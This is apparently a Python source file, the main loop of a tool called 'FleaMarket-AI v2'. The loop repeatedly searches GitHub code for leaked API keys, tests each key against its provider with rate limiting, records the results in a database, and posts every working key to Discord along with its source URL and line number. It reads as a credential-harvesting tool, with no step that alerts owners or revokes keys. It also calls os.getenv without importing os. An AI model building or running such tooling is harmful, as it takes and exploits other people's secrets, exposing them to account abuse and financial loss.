"""Main orchestrator for FleaMarket-AI v2 (Phase 1).

Changes from v1:
- Async validation with rate limiting (30 req/min max)
- Skip re-validating known-invalid keys
- Max 5 concurrent validations
- Validation history tracking

Usage:
    python -m src.main
"""

import asyncio
import logging
import logging.handlers
import sys
import traceback
from pathlib import Path

from . import db, discover, async_wrapper, notify

# ── Logging setup ─────────────────────────────────────────────────────────────
LOG_DIR = Path(__file__).resolve().parents[1] / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "fleamarket.log"

_fmt = logging.Formatter(
    fmt="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)

_file_handler = logging.handlers.RotatingFileHandler(
    LOG_FILE,
    maxBytes=5 * 1024 * 1024,  # 5 MB per file
    backupCount=5,
)
_file_handler.setFormatter(_fmt)

_console_handler = logging.StreamHandler(sys.stdout)
_console_handler.setFormatter(_fmt)

log = logging.getLogger(__name__)
log.setLevel(logging.INFO)
log.addHandler(_file_handler)
log.addHandler(_console_handler)

# Also capture logs from other modules
logging.getLogger("src.ratelimit").setLevel(logging.INFO)
logging.getLogger("src.ratelimit").addHandler(_file_handler)
logging.getLogger("src.async_wrapper").setLevel(logging.DEBUG)
logging.getLogger("src.async_wrapper").addHandler(_file_handler)


# Configuration
SLEEP_SECONDS = 4 * 3600  # 4 hours between discovery runs
MAX_CONCURRENT = 5        # Max concurrent validations
GLOBAL_RPM = 30           # Max 30 requests per minute
SKIP_INVALID = True       # Don't re-validate known-invalid keys


async def validate_candidates(candidates: list[tuple], source_url: str, line_numbers: dict = None) -> dict:
    """Validate discovered keys with rate limiting.
    
    Args:
        candidates: List of (provider, key) tuples
        source_url: Source URL for these keys
        line_numbers: Dict mapping (source_url, provider, key) -> line_num
        
    Returns:
        Stats dict with counts
    """
    stats = {"total": 0, "new": 0, "valid": 0, "invalid": 0, "skipped": 0, "errors": 0}
    
    # Filter candidates
    to_validate = []
    for provider, key in candidates:
        stats["total"] += 1
        
        # Check if we've seen this key before
        existing = db.get_key_by_hash(key, provider)
        if existing:
            # Skip if already invalid (unless forced)
            if SKIP_INVALID and existing.get("is_valid") == 0:
                log.debug("Skipping known-invalid %s key", provider)
                stats["skipped"] += 1
                continue
            # Skip if recently validated (within 24 hours)
            last_validated = existing.get("last_validated")
            if last_validated:
                from datetime import datetime, timedelta
                try:
                    last = datetime.fromisoformat(last_validated)
                    if datetime.utcnow() - last < timedelta(hours=24):
                        log.debug("Skipping recently-validated %s key", provider)
                        stats["skipped"] += 1
                        continue
                except Exception:
                    pass
        else:
            # New key - insert into DB
            db.upsert_key(provider, key, source_url, is_valid=None, validation_msg=None)
            stats["new"] += 1
        
        to_validate.append((key, provider))
    
    if not to_validate:
        log.info("No keys to validate (all skipped or already known)")
        return stats
    
    log.info("Validating %d keys (skipped %d known/invalid)", 
             len(to_validate), stats["skipped"])
    
    # Validate with async wrapper
    results = await async_wrapper.validate_batch(
        to_validate,
        max_concurrent=MAX_CONCURRENT,
        global_rpm=GLOBAL_RPM
    )
    
    # Process results
    for key, provider, is_valid, message in results:
        # Update DB
        db.upsert_key(provider, key, source_url, is_valid=is_valid, validation_msg=message)
        
        if is_valid:
            stats["valid"] += 1
            log.info("✓ Valid %s key found!", provider)
            # Notify on Discord
            line_num = line_numbers.get((source_url, provider, key)) if line_numbers else None
            notify.send_notification(provider, key, source_url, message, line_num)
        else:
            stats["invalid"] += 1
            log.debug("✗ Invalid %s key: %s", provider, message[:50])
    
    return stats


async def run_once():
    """Run one discovery + validation cycle."""
    log.info("=== Starting discovery cycle ===")
    
    # Discover candidates (pass GitHub token for authenticated code search)
    github_token = os.getenv("GITHUB_TOKEN")
    discoveries = discover.discover_keys(github_token=github_token)
    
    if not discoveries:
        log.info("No new candidates found this cycle")
        return
    
    log.info("Discovered %d candidate key(s)", len(discoveries))
    
    # Group by source for better logging
    by_source = {}
    line_numbers = {}  # Track line numbers for notifications
    for provider, key, source, line_num in discoveries:
        by_source.setdefault(source, []).append((provider, key))
        line_numbers[(source, provider, key)] = line_num
    
    # Validate each source's keys
    total_stats = {"total": 0, "new": 0, "valid": 0, "invalid": 0, "skipped": 0}
    
    for source_url, candidates in by_source.items():
        log.info("Processing %d keys from %s", len(candidates), source_url)
        stats = await validate_candidates(candidates, source_url, line_numbers)
        
        for k in total_stats:
            total_stats[k] += stats.get(k, 0)
    
    log.info(
        "Cycle complete: %d total, %d new, %d valid, %d invalid, %d skipped",
        total_stats["total"],
        total_stats["new"],
        total_stats["valid"],
        total_stats["invalid"],
        total_stats["skipped"]
    )


async def main_async():
    """Main async entry point."""
    log.info("=== FleaMarket-AI v2 started (interval=%.1fh) ===", SLEEP_SECONDS / 3600)
    
    # Initialize database
    db.init_db()
    
    try:
        while True:
            try:
                await run_once()
            except Exception as e:
                log.error("Error in cycle: %s", e)
                log.debug(traceback.format_exc())
            
            log.info("Sleeping for %.1fh ...", SLEEP_SECONDS / 3600)
            await asyncio.sleep(SLEEP_SECONDS)
    finally:
        async_wrapper.shutdown()


def main():
    """Entry point."""
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        log.info("Shutdown requested")
    except Exception as e:
        log.error("Fatal error: %s", e)
        log.debug(traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
